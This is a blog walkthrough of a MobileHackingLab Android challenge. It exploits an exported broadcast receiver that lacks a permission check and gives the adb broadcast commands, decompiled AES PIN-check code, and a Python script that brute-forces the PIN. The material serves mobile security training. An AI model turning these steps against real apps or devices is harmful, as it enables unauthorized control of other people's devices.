Hello Guys...

In this blog, I will walk you through a challenge that I come across. It is all about exploiting a Broadcast receiver vulnerability. The challenge is from a platform called [MobileHackingLabs](https://www.mobilehackinglab.com). It's a really good platform for testing your mobile pentesting skills. So let's get started.

#### Broadcast Receiver
A Broadcast receiver allows applications to send and receive broadcast messages from other applications and system-wide events. A few events include incoming calls, low battery, system boots up, etc. It is one of the core components of Android. When a broadcast is sent, the system automatically routes broadcasts to apps that have subscribed to receive that particular type of broadcast.<br>

I have downloaded the APK on my Kali machine and installed it on my Genymotion emulator using the `adb install` command.

When opening the application, we have two options: **Login** or **Sign Up**. Click on Signup and create a new user. Login with the new user, and you can see two buttons, **Setup** and **Master Switch**.<be>
Clicking on the Setup button, you can see a few devices that we can turn on or off. However, some devices like A/C and Speaker cannot be turned on since we logged in as a guest user.

When you click on **Master Switch**, it is protected by a 3-digit PIN. This button will start all devices with one click, but it can only be accessed through a privileged account.

### Analyzing Code

Open the APK in jadx and navigate to the AndroidManifest file. Search for **receiver**, and you will find a broadcast receiver named **MasterReceiver**, which is exported to true without permission restrictions, making it vulnerable to unauthorized access.

Further analysis revealed the presence of a class called **CommunicationManager** when searching for **MasterReceiver** within the Text Search feature of JADX.

Inside the onReceive method, the code checks if the intent's action is equal to the string **MASTER_ON**. If it is, the code extracts an integer extra from the intent with the key **key**. If the context2 parameter is not null and the **check_key** method from the **Checker** class returns true for the extracted integer, the code calls the **turnOnAllDevices** method on the CommunicationManager. It also displays a toast message saying **All devices are turned on**. If the check_key method returns false, the code displays a toast message saying **Wrong PIN!!** instead.

#### Checker class

Let's Break it down.

{% highlight kotlin %}
private static final String algorithm = "AES";
private static final String ds = "OSnaALIWUkpOziVAMycaZQ==";
{% endhighlight %}
- String **algorithm**: represents the encryption algorithm used, which is "AES"
- String **ds**: represents the encrypted data, which is a Base64-encoded string.

{% highlight kotlin %}
public final boolean check_key(int key) {
    try {
          return Intrinsics.areEqual(decrypt(ds, key), "master_on");
    } catch (BadPaddingException e) {
           return false;
    }
}
{% endhighlight %}
The check_key method takes an integer key as input and returns a boolean indicating whether the key is valid. It calls the **decrypt** method, passing the ds string and the key as arguments, and if the decryption is successful it returns **true**, and if it fails it returns **false**.

{% highlight kotlin %}
public final String decrypt(String ds2, int key) {
  Intrinsics.checkNotNullParameter(ds2, "ds");
  SecretKeySpec secretKey = generateKey(key);
  Cipher cipher = Cipher.getInstance(algorithm + "/ECB/PKCS5Padding");
  cipher.init(2, secretKey);
  if (Build.VERSION.SDK_INT >= 26) {
        byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(ds2));
        Intrinsics.checkNotNull(decryptedBytes);
        return new String(decryptedBytes, Charsets.UTF_8);
  }
    throw new UnsupportedOperationException("VERSION.SDK_INT < O");
}
{% endhighlight %}
This method takes two arguments: **ds2** (the encrypted data), and key. It decrypts the ds2 string using the key and returns the decrypted string. It checks if the ds2 parameter is not null, it will generate a **secretkeyspec** object from the key using the **generatekey** method. Then it creates another object called **cipher** with the specified algorithm ("AES/ECB/PKCS5Padding"). There is one more condition If the Android API level is 26 or higher, it decrypts the ds2 string using the Cipher object and returns the decrypted string as a UTF-8 encoded string, if not it throws an **UnsupportedOperationException**.

### Exploit

As the Receiver is exported to true, potential exploitation can be performed by crafting and sending an intent using **adb** with necessary action and extras. <br>
Open the terminal and enter the following command:

{% highlight bash %}
adb shell am broadcast -a MASTER_ON --ei key 123
{% endhighlight %}

![screen shot](/images/blog8/8.png)

Upon submitting an incorrect pin, a **Wrong Pin** response is returned. If we obtain the correct PIN, we can use the Master Switch to turn on all devices without needing the Master account. Below is a Python script created using ChatGPT to brute force a 3-digit pin.

{% highlight python %}
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from base64 import b64decode

# Encoded string and target value
encoded_ds = "OSnaALIWUkpOziVAMycaZQ=="
target_string = "master_on"

# Iterate through all possible keys
for key_int in range(1, 1000001):
    try:
        # Decrypt the encoded string with the current key
        decoded_ds = b64decode(encoded_ds)
        key_bytes = str(key_int).encode("utf-8").ljust(16, b'\0')[:16]
        cipher = AES.new(key_bytes, AES.MODE_ECB)
        decrypted = unpad(cipher.decrypt(decoded_ds), AES.block_size).decode("utf-8")

        # Check if the decrypted value matches the target
        if decrypted == target_string:
            print(f"Found key: {key_int}")
            break
    except Exception as e:
        continue
else:
    print("Key not found within limit.")
{% endhighlight %}

Copy the code to your local machine and run the script.

Next, open the terminal and enter the adb command we used earlier, this time with the **Correct PIN** that we just brute-forced. <br>
{% highlight bash %}
adb shell am broadcast -a MASTER_ON --ei key 345
{% endhighlight %}

![screen shot](/images/blog8/10.png)

You should see a message saying **ALL Devices are Turned on**. Now click on the Setup button and observe that all devices are turned on.

***Happy Pentesting..!***
